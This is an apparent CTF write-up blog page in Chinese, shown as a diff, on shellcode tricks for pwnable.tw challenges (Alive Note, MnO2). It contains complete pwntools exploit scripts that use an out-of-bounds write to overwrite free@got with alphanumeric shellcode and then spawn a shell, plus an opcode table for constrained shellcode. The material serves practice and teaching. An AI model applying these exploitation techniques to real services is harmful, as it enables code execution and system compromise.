+    &#39;jPX(A&quot;(A&quot;&#39; + # set eax=0x50 &amp;&amp; 2 * sub [0x41], 0x50
+    &#39;(A#(A#&#39; + # 2 * sub [0x42], 0x50
+    &#39;jCX4CP[&#39; + # set ebx=0
+    &#39;jpZ&#39; + # set edx=0x70
+    &#39;jCX,@&#39; # set eax=3
+).ljust(0x22, &#39;P&#39;) + &#39;m &#39;
+
+print len(sh)
+print disasm(sh)
+for c in sh:
+    if ord(c) &lt;= 0x1F or ord(c) &gt; 0x7F:
+        raise ValueError, &#39;Value error.&#39;
+
+#gdb.attach(p, &#39;b *0x080487EF&#39;)
+
+add(offset, sh)
+payload = &#39;\x90&#39; * 0x30 + asm(shellcraft.sh())
+#raw_input(&#39;@&#39;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h1 id="Adult-Shellcode"><a href="#Adult-Shellcode" class="headerlink" title="Adult Shellcode"></a>Adult Shellcode</h1><h2 id="Alive-Note"><a href="#Alive-Note" class="headerlink" title="Alive Note"></a>Alive Note</h2><p>这道题的程序和上面的差不多，但具体利用部分有些不同。<code>add_note</code> 中一开始的数组越界还是存在的，后面读取 Name 的时候只能读 8 个字节，意味着 shellcode 只能 8 字节为单位地送，且 <code>check</code> 函数下面的提示说只能用 alphanumeric：</p>
+<pre><code class="cpp">unsigned int add_note()
+{
+  int idx; // [esp+0h] [ebp-18h]
+  char s; // [esp+4h] [ebp-14h]
+  unsigned int v3; // [esp+Ch] [ebp-Ch]
+
+  v3 = __readgsdword(0x14u);
+  printf(&quot;Index :&quot;);
+  idx = read_int();
+  if ( idx &gt; 10 )
+  {
+    puts(&quot;Out of bound !!&quot;);
+    exit(0);
+  }
+  printf(&quot;Name :&quot;);
+  read_input(&amp;s, 8u);
+  if ( !check(&amp;s) )
+  {
+    puts(&quot;It must be a alnum name !&quot;);
+    exit(-1);
+  }
+  note[idx] = strdup(&amp;s);
+  puts(&quot;Done !&quot;);
+  return __readgsdword(0x14u) ^ v3;
+}
+</code></pre>
+<p>在调试过程中，看到堆上大概是这样，prev_size 和 chunk_size 两个字段是固定的，剩下的 8 个字节可以填 shellcode：</p>
+<pre><code>gef➤  x/4wx 0x0804b000
+0x804b000:    0x00000000    0x00000011    0x00000031    0x00000000
+</code></pre><p>固定的字段的 asm 只跟 <code>eax</code> 有关，如果要使用的话只需要确保 <code>eax</code> 指向的内存是存在的：</p>
+<pre><code class="python">from pwn import *
+s = p32(0) + p32(0x11)
+print disasm(s)
+#   0:   00 00                   add    BYTE PTR [eax],al
+#   2:   00 00                   add    BYTE PTR [eax],al
+#   4:   11 00                   adc    DWORD PTR [eax],eax
+#   6:   00 00                   add    BYTE PTR [eax],al
+</code></pre>
+<p>接下来看一下 check 函数，就是要保证输入的字符串是 alphanumeric 以及空格：</p>
+<blockquote>
+<p><code>__ctype_b_loc</code> 主要获取一个数组列表，可容纳 <code>-128~255</code> 范围的字符，对应字符值索引可获取到本地语言的字符集，对于要求的字符与掩码位求与即可得到该字符是否为某种掩码位类型的字符：</p>
+</blockquote>
+<pre><code class="cpp">int __cdecl check(char *s)
+{
+  size_t i; // [esp+Ch] [ebp-Ch]
+
+  for ( i = 0; strlen(s) &gt; i; ++i )
+  {
+    if ( s[i] != 32 &amp;&amp; !((*__ctype_b_loc())[s[i]] &amp; 8) )
+      return 0;
+  }
+  return 1;
+}
+</code></pre>
+<p>思路基本上就是第一次 add 的时候把 <code>free@got</code> 修改为堆上的 shellcode，接下来把 shellcode 分段送上去，最后 delete 掉第一次的 note 来执行 shellcode。先看看寄存器的状态：</p>
+<pre><code>───────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────
+ EAX  0x99a9008 ◂— 0x58 /* &#39;X&#39; */
+ EBX  0x0
+ ECX  0x0
+ EDX  0x0
+ EDI  0xf76cb000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ ESI  0xf76cb000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ EBP  0xffd6f598 —▸ 0xffd6f5a8 ◂— 0x0
+ ESP  0xffd6f56c —▸ 0x80488ef (del_note+81) ◂— add    esp, 0x10
+ EIP  0x80484e0 (free@plt) ◂— jmp    dword ptr [0x804a014]
+────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────
+ ► 0x80484e0 &lt;free@plt&gt;    jmp    dword ptr [0x804a014]
+    ↓
+   0x99a9008               pop    eax
+   0x99a9009               add    byte ptr [eax], al
+   0x99a900b               add    byte ptr [eax], al
+   0x99a900d               add    byte ptr [eax], al
+   0x99a900f               add    byte ptr [eax], al
+   0x99a9011               add    byte ptr [eax], al
+   0x99a9013               add    cl, dh
+   0x99a9015               lar    eax, word ptr [eax]
+   0x99a9018               add    byte ptr [eax], al
+   0x99a901a               add    byte ptr [eax], al
+</code></pre><p>可以看到 <code>eax</code> 是指向了 shellcode，其他几个系统调用会用到的寄存器为 0。接下来要解决的主要问题就是中间的 padding 部分怎么绕过。可以把 <code>eax</code> 指向栈上，这样就不会干扰到，但这样的话在构造 shellcode 的时候还是挺麻烦的。最好的方法就是充分利用几个跳转指令，就不用在意中间的 padding，只需要计算好跳转的偏移，构造起来也比较麻烦，但效果远比前一种方法好。这里主要参考了这个 <a href="https://github.com/HyperSine/pwnable.tw/blob/master/Alive%20Note/solve.py" target="_blank" rel="noopener">Exploit</a>（几处跳转构造得太秀了）：</p>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+
+context.log_level = &#39;debug&#39;
+
+local = 1
+if local:
+    p = process(&#39;./alive_note&#39;)
+else:
+    p = remote(&#39;chall.pwnable.tw&#39;, 10300)
+
+elf = ELF(&#39;./alive_note&#39;)
+
+def cmd(c):
+    p.recvuntil(&#39;choice :&#39;)
+    p.sendline(str(c))
+
+def add(idx, name):
+    cmd(1)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(idx))
+    p.recvuntil(&#39;Name :&#39;)
+    p.sendline(name)
+
+def show(idx):
+    cmd(2)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(idx))
+
+def delete(idx):
+    cmd(3)
+    p.recvuntil(&#39;Index :&#39;)
+    p.sendline(str(idx))
+
+def quit():
+    cmd(4)
+
+note = 0x0804A080
+offset = (elf.got[&#39;free&#39;] - note) / 4
+info(offset)
+padding = p32(0) + p32(0x11)
+
+#   0:   50                      push   eax
+#   1:   59                      pop    ecx
+#   2:   6a 7a                   push   0x7a
+#   4:   5a                      pop    edx
+#   5:   53                      push   ebx
+#   6:   75 38                   jne    0x40
+#   8:   00 00                   add    BYTE PTR [eax],al
+#   a:   00 00                   add    BYTE PTR [eax],al
+#   c:   11 00                   adc    DWORD PTR [eax],eax
+#   e:   00 00                   add    BYTE PTR [eax],al
+#  10:   34 46                   xor    al,0x46
+#  12:   30 41 35                xor    BYTE PTR [ecx+0x35],al
+#  15:   53                      push   ebx
+#  16:   75 38                   jne    0x50
+#  18:   00 00                   add    BYTE PTR [eax],al
+#  1a:   00 00                   add    BYTE PTR [eax],al
+#  1c:   11 00                   adc    DWORD PTR [eax],eax
+#  1e:   00 00                   add    BYTE PTR [eax],al
+#  20:   66 75 63                data16 jne 0x86
+#  23:   6b 50 50 50             imul   edx,DWORD PTR [eax+0x50],0x50
+#  27:   50                      push   eax
+#  28:   00 00                   add    BYTE PTR [eax],al
+#  2a:   00 00                   add    BYTE PTR [eax],al
+#  2c:   11 00                   adc    DWORD PTR [eax],eax
+#  2e:   00 00                   add    BYTE PTR [eax],al
+#  30:   58                      pop    eax
+#  31:   34 33                   xor    al,0x33
+#  33:   34 30                   xor    al,0x30
+#  35:   74 39                   je     0x70
+#  37:   50                      push   eax
+#  38:   00 00                   add    BYTE PTR [eax],al
+#  3a:   00 00                   add    BYTE PTR [eax],al
+#  3c:   11 00                   adc    DWORD PTR [eax],eax
+#  3e:   00 00                   add    BYTE PTR [eax],al
+#  40:   58                      pop    eax
+#  41:   48                      dec    eax
+#  42:   30 41 46                xor    BYTE PTR [ecx+0x46],al
+#  45:   75 36                   jne    0x7d
+#  47:   50                      push   eax
+#  48:   00 00                   add    BYTE PTR [eax],al
+#  4a:   00 00                   add    BYTE PTR [eax],al
+#  4c:   11 00                   adc    DWORD PTR [eax],eax
+#  4e:   00 00                   add    BYTE PTR [eax],al
+#  50:   30 41 36                xor    BYTE PTR [ecx+0x36],al
+#  53:   30 41 57                xor    BYTE PTR [ecx+0x57],al
+#  56:   75 61                   jne    0xb9
+sh = (
+    &#39;PYjzZSu8&#39; + padding +
+    &#39;4F0A5Su8&#39; + padding +
+    &#39;fuckPPPP&#39; + padding +
+    &#39;X4340t9P&#39; + padding +
+    &#39;XH0AFu6P&#39; + padding +
+    &#39;0A60AWua&#39;
+)
+print disasm(sh)
+sh = sh.split(padding)
+
+#gdb.attach(p, &#39;b *0x080488EA\nc&#39;)
+
+#sh = &#39;PYTXuA&#39;
+add(offset, sh[0])
+for i in range(5):
+    add(i, sh[i + 1])
+delete(offset)
+
+payload = &#39;\x90&#39; * 0x37 + asm(shellcraft.sh())
+#raw_input(&#39;@&#39;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<h1 id="Hell-Shellcode"><a href="#Hell-Shellcode" class="headerlink" title="Hell Shellcode"></a>Hell Shellcode</h1><h2 id="MnO2"><a href="#MnO2" class="headerlink" title="MnO2"></a>MnO2</h2><p>同样是 shellcode，这道题里只能用元素周期表中的元素以及数字：</p>
+<pre><code class="txt">H He Li Be B C N O F Ne Na Mg Al Si P S Cl Ar K Ca Sc Ti V Cr Mn Fe Co Ni Cu Zn Ga Ge As Se Br Kr Rb Sr Y Zr Nb Mo Tc Ru Rh Pd Ag Cd In Sn Sb Te I Xe Cs Ba La Ce Pr Nd Pm Sm Eu Gd Tb Dy Ho Er Tm Yb Lu Hf Ta W Re Os Ir Pt Au Hg Tl Pb Bi Po At Rn Fr Ra Ac Th Pa U Np Pu Am Cm Bk Cf Es Fm Md No Lr Rf Db Sg Bh Hs Mt Ds Rg Cn Fl Lv
+0 1 2 3 4 5 6 7 8 9
+</code></pre>
+<p>先试试大概有哪些能用。大部分都是一些 <code>inc</code> 和 <code>dec</code>，还有一些 <code>push</code> 和 <code>pop</code>，但这些肯定不够，还得用上一些元素的组合：</p>
+<pre><code class="txt">[H]        dec eax
+[He]    dec eax ; xor gs:[ecx], xx
+[Li]    dec esp ; imul esi, [eax], xx
+[Be]    inc edx ; xor gs:[ecx], xx
+[B]        inc edx
+[C]        inc ebx
+[N]        dec esi
+[O]        dec edi
+[F]        inc esi
+[Ne]    dec esi ; xor gs:[ecx], xx
+[Na]    dec esi ; popa
+[Mg]    dec ebp ; xxxx
+[Al]    inc ecx ; ins es:[edi], dx
+[Si]    push ebx ; imul esi, [eax], xx
+[P]        push eax
+[S]        push ebx
+[Cl]    inc ebx ; ins es:[edi], dx
+[Ar]    inc ecx ; jb xx
+[K]        dec ebx
+[Ca]    inc ebx ; popa
+[Sc]    push ebx ; xxxx
+[Ti]    push esp ; imul esi, [eax], xxxx
+[V]        push esi
+[Cr]    inc ebx ; jb xx
+[Mn]    dec ebp ; outs dx, ds:[esi]
+[Fe]    inc esi ; xxxx
+[Co]    inc ebx ; outs dx, ds:[esi]
+[Ni]    dec esi ; imul esi, [eax], xxxx
+[Cu]    inc ebx ; jne xx
+[Zn]    pop edx ; outs dx, ds:[esi]
+[Ga]    inc edi ; popa
+[Ge]    inc edi ; xxxx
+[As]    inc ecx ; jae xx
+[Se]    push ebx ; xxxx
+[Br]    inc edx ; jb xx
+[Kr]    dec ebx ; jb xx
+[Rb]    push edx ; xxxx
+[Sr]    push ebx ; jb xx
+[Y]        pop ecx
+[Zr]    pop edx ; jb xx
+[Nb]    dec esi ; xxxx
+[Mo]    dec ebp ; outs dx, ds:[esi]
+[Tc]    push esp ; xxxx
+[Ru]    push edx ; jne xx
+[Rh]    push edx ; push xxxx
+[Pd]    push eax ; xxxx
+[Ag]    inc ecx ; xxxx
+[Cd]    inc ebx ; xxxx
+[In]    dec ecx ; outs dx, ds:[esi]
+[Sn]    push ebx ; outs dx, ds:[esi]
+[Sb]    push ebx ; xxxx
+[Te]    push esp ; xxxx
+[I]        dec ecx
+[Xe]    pop eax ; xxxx
+[Cs]    inc ebx ; jae xx
+[Ba]    inc edx ; popa
+[La]    dec esp ; popa
+[Ce]    inc ebx ; xxxx
+[Pr]    push eax ; jb xx
+[Nd]    dec esi ; xxxx
+[Pm]    push eax ; ins es:[edi], dx
+[Sm]    push ebx ; ins es:[edi], dx
+[Eu]    inc ebp ; jne xx
+[Gd]    inc edi ; xxxx
+[Tb]    push esp ; xxxx
+[Dy]    inc esp ; jns xx
+[Ho]    dec eax ; xxxx
+[Er]    inc ebp ; jb xx
+[Tm]    push esp ; ins es:[edi], dx
+[Yb]    pop ecx ; xxxx
+[Lu]    dec esp ; jne xx
+[Hf]    dec eax ; xxxx
+[Ta]    push esp ; popa
+[W]        push edi
+[Re]    push edx ; xxxx
+[Os]    dec edi ; jae xx
+[Ir]    dec ecx ; jb xx
+[Pt]    push eax ; je xx
+[Au]    inc ecx ; jne xx
+[Hg]    dex eax ; xxxx
+[Tl]    push esp ; ins es:[edi], dx
+[Pb]    push eax ; xxxx
+[Bi]    inc edx ; imul esi, [eax], xx
+[Po]    push eax ; outs dx, ds:[esi]
+[At]    inc ecx ; je xx
+[Rn]    push edx ; outs dx, ds:[esi]
+[Fr]    inc esi ; jb xx
+[Ra]    push edx ; popa
+[Ac]    inc ecx ; xxxx
+[Th]    push esp ; push xxxx
+[Pa]    push eax ; popa
+[U]        push ebp
+[Np]    dec esi ; jo xx
+[Pu]    push eax ; jne xx
+[Am]    inc ecx ; ins es:[edi], dx
+[Cm]    inc ebx ; ins es:[edi], dx
+[Bk]    inc edx ; imul esi, [eax], xx
+[Cf]    inc ebx ; xxxx
+[Es]    inc ebp ; jae xx
+[Fm]    inc esi ; ins es:[edi], dx
+[Md]    dec ebp ; xxxx
+[No]    dec esi ; outs dx, ds:[esi]
+[Lr]    dec esp ; jb xx
+[Rf]    push edx ; xxxx
+[Db]    inc esp ; xxxx
+[Sg]    push xx ; xxxx
+[Bh]    inc edx ; push xxxx
+[Hs]    dec eax ; jae xx
+[Mt]    dec ebp ; je xx
+[Ds]    inc esp, jae xx
+[Rg]    push edx ; xxxx
+[Cn]    inc ebx ; outs dx, ds:[esi]
+[Fl]    inc esi ; ins es:[edi], dx
+[Lv]    dec esp ; jbe xx
+</code></pre>
+<p>再看看运行 shellcode 的时候寄存器的状态。可以发现 <code>eax</code> 指向了输入的 shellcode，<code>ebx</code> 和 <code>ecx</code> 分别为 0：</p>
+<pre><code>─────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────
+ EAX  0x324f6e4d ◂— dec    ebp /* 0x324f6e4d; &#39;MnO2&#39; */
+ EBX  0x0
+ ECX  0x0
+ EDX  0x80488a1 ◂— dec    edi /* &#39;O&#39; */
+ EDI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
+ ESI  0xf7fc5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
+ EBP  0xffffd718 ◂— 0x0
+ ESP  0xffffd6dc —▸ 0x80487ea (main+169) ◂— mov    dword ptr [esp], 0
+ EIP  0x324f6e4d ◂— dec    ebp /* 0x324f6e4d; &#39;MnO2&#39; */
+───────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────
+ ► 0x324f6e4d    dec    ebp
+   0x324f6e4e    outsb  dx, byte ptr [esi]
+   0x324f6e4f    dec    edi
+   0x324f6e50    xor    al, byte ptr [eax]
+   0x324f6e52    add    byte ptr [eax], al
+   0x324f6e54    add    byte ptr [eax], al
+   0x324f6e56    add    byte ptr [eax], al
+   0x324f6e58    add    byte ptr [eax], al
+   0x324f6e5a    add    byte ptr [eax], al
+   0x324f6e5c    add    byte ptr [eax], al
+   0x324f6e5e    add    byte ptr [eax], al
+</code></pre><p>然后基本上就是继续找有用的部分来构造 <code>int 0x80</code>。试了好久发现 <code>Cf</code> 元素数字的组合发现可以构造出指定地址内容异或的指令：</p>
+<pre><code class="python">In [1]: print disasm(&#39;Cf151111&#39;)
+   0:   43                      inc    ebx
+   1:   66 31 35 31 32 33 34    xor    WORD PTR ds:0x31313131,si
+</code></pre>
+<p>而且题目没有开 ASLR，可以在固定的地址放上数据，通过异或构造出 <code>int 0x80</code>，最后根据寄存器的状态利用 <code>popa</code> 设置好寄存器的值，来触发 <code>read</code>，再把真正的 shellcode 传进去。</p>
+<p>400 分的题就不放 Exploit 了。</p>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/qq_29343201/article/details/78109066" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/78109066</a><br><a href="https://abda.nl/posts/2018/06/pwnable.tw-orw/" target="_blank" rel="noopener">https://abda.nl/posts/2018/06/pwnable.tw-orw/</a><br><a href="http://p4nda.top/2017/09/29/pwnable-tw-deathnote/" target="_blank" rel="noopener">http://p4nda.top/2017/09/29/pwnable-tw-deathnote/</a><br><a href="https://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/" target="_blank" rel="noopener">https://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/</a><br><a href="https://www.cnblogs.com/p4nda/p/7992951.html" target="_blank" rel="noopener">https://www.cnblogs.com/p4nda/p/7992951.html</a><br><a href="https://github.com/HyperSine/pwnable.tw/blob/master/Alive%20Note/solve.py" target="_blank" rel="noopener">https://github.com/HyperSine/pwnable.tw/blob/master/Alive%20Note/solve.py</a><br><a href="https://n132.github.io/2019/02/23/2019-02-23-mno2/" target="_blank" rel="noopener">https://n132.github.io/2019/02/23/2019-02-23-mno2/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/03/04/Ubuntu16-04下编译libc2-23/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Ubuntu16.04下编译libc2.23</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/02/23/【译】Radare2之旅-Part2：Exploitation/">
+                        <span>【译】Radare2之旅-Part2：Exploitation</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Shellcode Tricks&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+          tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+              processEscapes: true,
+              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+          }
+      });
+
+      MathJax.Hub.Queue(function() {
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i=0; i < all.length; i += 1) {
+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+      });
+
+    </script>
+
+    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="custom_mathjax_source">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+  
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
